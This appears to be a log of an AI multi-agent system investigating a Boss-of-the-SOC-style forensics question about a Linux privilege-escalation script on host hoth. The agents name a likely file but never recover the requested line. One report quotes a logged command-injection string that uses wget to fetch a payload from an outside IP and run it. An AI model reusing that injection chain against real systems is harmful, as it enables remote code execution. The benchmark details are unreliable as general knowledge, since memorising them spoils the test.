# Q328 — SH <-> Senior conversation

### 14:38:29 - SH -> (new)   [SPAWN]
**Constraints:** sourcetypes=['osquery:results', 'bash_history', 'linux_audit', 'syslog', 'lsof', 'ps'] sources=- fields=['host', 'name', 'path', 'columns.path', 'columns.target_path', 'columns.content', 'columns.cmdline', 'cmdline', 'process', 'process_name', 'parent', 'uid', 'euid', 'user', 'message', '_raw']
**Technique:** senior
**Reason:** This question is about a Linux privilege-escalation file and its contents, so the right starting scope is Linux endpoint telemetry and audit/process/file artifacts that can reveal what file tomcat8 used for escalation and any logged file content or command history referencing it.

Within Linux host telemetry for the August 2018 Frothly incident, identify the file used to escalate tomcat8's permissions to root, then recover the text displayed on line 2 of that specific file and report the entire line exactly.

### 14:40:27 - s1 -> SH   [REPORT - round 1 - NOT_FOUND]
> Credible candidate scope is hoth, user tomcat8. The suspicious executable/process name colonelnew and the reverse-shell command suggest the escalation artifact is a local file or script on hoth, but I did not reach file-content telemetry or command history that explicitly names it. The exact line 2 
_full: reports/s1_round_1.md_

### 14:40:32 - SH -> s1   [COMMAND]
**continue** — The case now has a grounded host and user context: hoth with tomcat8 and the suspicious `colonelnew` process. We still need the actual file and its contents, so the work should continue inside Linux host artifacts that expose file names and file text context.
**New scope:** sourcetypes=['bash_history', 'linux_audit', 'ps', 'lsof', 'osquery:results'] sources=[] fields=['host', 'user', 'USER', 'process_name', 'process_exec', 'app', 'ARGS', 'command', 'exe', 'type', 'op', 'msg', 'bash_command', 'path', 'target_path', 'filename', 'name', 'cmdline']

On host hoth, establish what specific file was used to escalate tomcat8 to root by examining Linux file/listing and command-history-adjacent telemetry that can reveal created, modified, referenced, or executed files around the tomcat8 and `colonelnew` activity. Once the file path/name is established, recover the text of line 2 from any artifact that logs the file contents, a preview, or a command that printed or edited that file.

### 14:41:57 - s1 -> SH   [REPORT - round 2 - NOT_FOUND]
> Grounded candidate file path on hoth: /tmp/definitelydontinvestigatethisfile.sh. Strong supporting artifacts: FIM recorded it as created/updated by tomcat8, and the same host had /tmp/colonelnew, /tmp/colonel, and /tmp/colonel.c in file events. However, I do not have the requested line-2 text from a
_full: reports/s1_round_2.md_

### 14:42:02 - SH -> s1   [COMMAND]
**continue** — The case now has a specific likely escalation file path tied to tomcat8 on hoth, which is major progress. What remains is to recover the exact line 2 text from artifacts that expose the script contents rather than broadening away from this file.
**New scope:** sourcetypes=['osquery:results', 'bash_history', 'linux_audit', 'ps'] sources=['/var/log/osquery/osqueryd.results.log', '/home/ec2-user/.bash_history', '/var/log/audit/audit.log', 'ps'] fields=['host', 'name', 'cmdline', 'columns.target_path', 'columns.path', 'columns.command', 'columns.action', 'decorations.username', 'bash_command', 'command', 'exe', 'msg']

On host hoth, use osquery shell-history, command-line, and any Linux host artifacts that can reveal interaction with `/tmp/definitelydontinvestigatethisfile.sh` to establish whether its contents were viewed, printed, edited, copied, or compiled. Recover the exact text of line 2 from any content-bearing artifact tied to that file, and if direct file text is absent, establish the nearest artifact that reconstructs the script contents in order.

### 14:42:59 - s1 -> SH   [REPORT - round 3 - NOT_FOUND]
> Newly confirmed on hoth/root shell history: `vi /etc/tomcat8/tomcat-users.xml` and `cat /var/log/audit/audit.log`. This suggests the attack may have used or modified Tomcat configuration in addition to the escalation script, but I still cannot reconstruct the exact line 2 of `/tmp/definitelydontinve
_full: reports/s1_round_3.md_

### 14:43:04 - SH -> s1   [COMMAND]
**retry** — The case now has a specific likely escalation file on hoth, but this round did not recover any new content-bearing artifact for that file. We need a narrower pass centered on the exact script path and artifacts that can preserve file text.
**New scope:** sourcetypes=['osquery:results', 'linux_audit', 'ps', 'bash_history'] sources=['/var/log/osquery/osqueryd.results.log', '/var/log/audit/audit.log', 'ps', '/home/ec2-user/.bash_history'] fields=['host', 'name', 'cmdline', 'columns.target_path', 'columns.path', 'columns.command', 'columns.action', 'decorations.username', 'bash_command', 'command', 'exe', 'msg']

On host hoth, focus specifically on the exact path `/tmp/definitelydontinvestigatethisfile.sh` and establish every artifact family that references that file directly, especially command-line, file-integrity, shell-history, and any content-bearing telemetry that could preserve script text. First determine whether any artifact logs the script body, a printed excerpt, an editor invocation with recoverable context, or a copy/redirect action involving that exact file; then recover the full text of line 2 from that artifact.

### 14:43:39 - s1 -> SH   [REPORT - round 4 - NOT_FOUND]
> Confirmed artifact family on hoth: FIM on /tmp/definitelydontinvestigatethisfile.sh. No content-bearing artifact was found in the narrowed scope, so the exact line 2 text cannot be reconstructed from the evidence currently retrieved. The best-supported candidate remains the same script path on hoth,
_full: reports/s1_round_4.md_

### 14:43:45 - SH -> s1   [RETIRE]
This senior established the likely escalation script on hoth as `/tmp/definitelydontinvestigatethisfile.sh` and exhausted the available Linux process/history/FIM path without recovering line 2. Handoff: preserve hoth, tomcat8, suspicious `colonelnew`, and the likely escalation file path for a new evidence family.

### 14:43:45 - s1 -> SH   [HANDOFF]
_full: handoffs/s1_handoff.md_

### 14:43:45 - SH -> (new)   [SPAWN]
**Constraints:** sourcetypes=['osquery:info', 'osquery:results', 'syslog', 'errors', 'linux_secure', 'access_combined'] sources=['/var/log/osquery/osqueryd.INFO', '/var/log/syslog', '/var/log/messages', '/var/log/httpd/access_log', '/var/log/apache2/access.log'] fields=['host', 'message', 'path', 'cmdline', 'name', 'columns.*', '_raw']
**Technique:** senior
**Reason:** The retired senior's constraints were centered on bash history, linux audit, ps, and osquery FIM/shell-history, which established the likely file path but did not cover broader server/application/log artifacts that might retain the script contents or a transferred copy.

Using alternative Linux/server telemetry for host hoth, determine whether the likely escalation script `/tmp/definitelydontinvestigatethisfile.sh` was copied from, downloaded from, embedded in, or echoed into another artifact that preserves its contents. Recover the exact text shown on line 2 of that file and report the full line verbatim.

### 14:46:35 - s2 -> SH   [REPORT - round 1 - NOT_FOUND]
> Confirmed hoth is present in osquery:results (host/hostIdentifier=hoth) and that alternative telemetry includes scheduled_tasks, file hashes, and bash_history. Sampled bash history shows artifact-transfer behavior (python s3-upload.py) suggesting copy/upload activity may exist, but I did not locate 
_full: reports/s2_round_1.md_

### 14:46:40 - SH -> s2   [COMMAND]
**retry** — This round produced no new query and no additional evidence, so the current pass cannot simply continue. The case still needs any artifact on hoth that preserves the body of `/tmp/definitelydontinvestigatethisfile.sh`, especially through transfer, application, or logging side effects.
**New scope:** sourcetypes=['syslog', 'cron-too_small', 'package', 'linux_audit', 'access_combined', 'apache_error'] sources=['/var/log/syslog', '/var/log/messages'] fields=['host', 'process', 'message', 'cmd', 'path', 'filename', 'url', 'uri', 'command', 'exe']

On host hoth, use alternative Linux/server telemetry outside the exhausted FIM and shell-history path to establish whether `/tmp/definitelydontinvestigatethisfile.sh` was transferred, uploaded, downloaded, echoed, copied, compiled from, or referenced by an application or service log that preserves its contents. Prioritize syslog, cron/task-related telemetry, package/install logs, and transfer/application artifacts that can reveal the script body or a reproduced copy, then recover the full text of line 2 exactly.

### 14:47:45 - s2 -> SH   [REPORT - round 2 - NOT_FOUND]
> I narrowed the alternative telemetry scope on hoth to syslog, cron, package, and access logs. Syslog is verified for hoth and includes osqueryd/CRON/systemd activity; cron and package feeds exist; access_combined contains a preserved command-like parameter (ping_ip) that suggests content-preserving 
_full: reports/s2_round_2.md_

### 14:47:50 - SH -> s2   [COMMAND]
**continue** — This round did not recover line 2, but it did surface a new, plausible content-bearing artifact family in access logs rather than repeating the exhausted Linux history/FIM path. The case needs one focused pass on whether web request parameters on hoth preserved the script body or commands that wrote it.
**New scope:** sourcetypes=['access_combined'] sources=['/var/log/httpd/access_log', '/var/log/apache2/access.log'] fields=['host', 'url', 'uri', 'path', 'filename', 'ping_ip', 'command', 'process', 'message']

On host hoth, use web/application access logging that can preserve request parameters or command-like values to establish whether `/tmp/definitelydontinvestigatethisfile.sh` was created, populated, or invoked through a web-facing action. Focus specifically on artifacts such as preserved command parameters, request values, or file references that mention the exact script path, `colonelnew`, tomcat8, or commands that would write script contents line by line; then reconstruct the script sufficiently to recover the entire text of line 2 exactly.

### 14:49:09 - s2 -> SH   [REPORT - round 3 - NOT_FOUND]
> This pass established that access_combined on hoth does preserve command-like request parameters. The key event is a luci nslookup request whose ping_ip parameter contains a full injected shell chain: google.ca ; cd /tmp; wget http://178.128.11.199/rvs -O /tmp/rz; chmod 777 /tmp/rz; sh /tmp/rz. That
_full: reports/s2_round_3.md_

### 14:49:12 - SH -> s2   [RETIRE]
This senior tested alternative server/application logs on hoth, confirmed an exploit request that downloaded and executed /tmp/rz, but still did not recover any artifact preserving the contents of /tmp/definitelydontinvestigatethisfile.sh or its line 2. Handoff: retain hoth, tomcat8, suspicious `colonelnew`, likely escalation file `/tmp/definitelydontinvestigatethisfile.sh`, and the web exploit chain fetching `/tmp/rz` as related compromise context rather than proven script content.

### 14:49:13 - s2 -> SH   [HANDOFF]
_full: handoffs/s2_handoff.md_

### 14:49:17 - SH -> (new)   [SPAWN]
**Constraints:** sourcetypes=- sources=- fields=-
**Technique:** exploration
**Reason:** The prior seniors exhausted Linux audit/process/history/FIM and web access-log paths without recovering file contents. I cannot name a tighter unused scope from the case file alone, so a one-shot exploration worker is needed to discover any remaining content-bearing source.

Within index=botsv3, find any evidence family not yet used that preserves or reconstructs the contents of the likely privilege-escalation script /tmp/definitelydontinvestigatethisfile.sh on host hoth, and recover the exact text displayed on line 2.

### 14:55:50 - e3 -> SH   [REPORT - round 1 - SCOPE]
> Term 'definitelydontinvestigatethisfile.sh' matched in osquery:results (events~219997, first=1534737603, last=1534778275) and WinEventLog:Security. Other terms (definitelydontinvestigatethisfile, hoth, file, script, integrity, audit) yielded no relevant feeds.
_full: reports/e3_round_1.md_

### 14:55:54 - SH -> (new)   [SPAWN]
**Constraints:** sourcetypes=['osquery:results', 'WinEventLog'] sources=['/var/log/osquery/osqueryd.results.log', 'WinEventLog:Security'] fields=['host', 'name', 'columns.target_path', 'columns.command', 'columns.cmdline', 'columns.path', 'decorations.username', 'Message', 'CommandLine', 'ProcessName', 'ObjectName']
**Technique:** senior
**Reason:** The exploration worker identified exact matches for the script name in osquery:results and WinEventLog:Security, which is a tighter unused scope than the prior seniors held and is the best remaining path to recover line 2.

Using only osquery:results from /var/log/osquery/osqueryd.results.log and WinEventLog:Security, determine whether the likely escalation script /tmp/definitelydontinvestigatethisfile.sh on host hoth appears in command-line, file, or security-event context that preserves or reconstructs its contents, and recover the full text displayed on line 2 exactly.

### 14:56:40 - s4 -> SH   [REPORT - round 1 - NOT_FOUND]
> The only confirmed useful feed access was osquery:results and WinEventLog:Security. osquery sample output shows JSON columns with cmdline/path fields, but the first 5 events did not include the target script. The Security source exists under sourcetype=WinEventLog and contains at least 2 filename hi
_full: reports/s4_round_1.md_

### 14:58:14 - SH -> s4   [RETIRE]
This senior is out of rounds. Handoff: WinEventLog:Security under sourcetype WinEventLog produced 2 matching rows for the script token `definitelydontinvestigatethisfile`, but their Message contents were not inspected before cutoff; osquery exact-path/token searches did not yield the script body.

### 14:58:14 - s4 -> SH   [HANDOFF]
_full: handoffs/s4_handoff.md_

### 14:58:14 - runner   [NOTE]
question ended: rounds — no ANSWER from SH; submitting 'SH retired without answering'

